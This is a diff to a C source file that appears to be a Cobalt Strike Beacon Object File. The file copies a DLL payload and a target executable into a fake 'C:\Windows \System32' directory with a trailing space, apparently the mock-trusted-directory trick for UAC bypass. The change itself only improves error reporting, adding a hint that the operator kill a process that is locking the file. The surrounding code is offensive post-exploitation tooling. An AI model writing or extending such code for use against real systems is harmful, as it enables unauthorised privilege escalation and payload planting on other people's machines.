@@ -30,6 +30,7 @@ void go(char * args, int alen)
 	wchar_t originalDLLLocation[100] = {0};
 	wchar_t newDLLLocation[100] = {0};
 	datap parser;
+	DWORD errorcode;
 	BeaconDataParse(&parser, args, alen);
 	wchar_t* targetProc = (wchar_t*)BeaconDataExtract(&parser, NULL);
 	wchar_t* DLL = (wchar_t*)BeaconDataExtract(&parser, NULL);;
@@ -56,8 +57,13 @@ void go(char * args, int alen)
 	// Copy the DLL payload and target executable to "C:\Windows \System32"
 	BeaconPrintf(CALLBACK_OUTPUT, "Copying file from \"%ls\" to \"%ls\".", originalLocation, newLocation);
 	KERNEL32$CopyFileW((LPCTSTR)originalLocation, (LPCTSTR)newLocation, FALSE);
-	if(KERNEL32$GetLastError()!=0){
-		BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy file to the destination.", KERNEL32$GetLastError());
+	errorcode = KERNEL32$GetLastError();
+	if(errorcode!=0){
+		if(errorcode==32){
+			BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination because it is running by another program. Please kill the process and retry.", KERNEL32$GetLastError());
+		}else{
+			BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination.", KERNEL32$GetLastError());
+		}	
 		goto FileCleanup;
 		return;
 	}else{
